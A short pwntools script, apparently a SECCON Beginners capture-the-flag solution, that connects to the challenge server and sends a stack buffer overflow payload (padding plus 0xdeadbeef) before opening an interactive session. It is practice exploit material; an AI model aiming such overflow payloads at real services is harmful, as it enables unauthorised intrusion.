from pwn import *

r = remote('pwn1.chall.beginners.seccon.jp', 16268)

r.sendline('A' * 0x2c + p32(0xdeadbeef))

r.interactive()
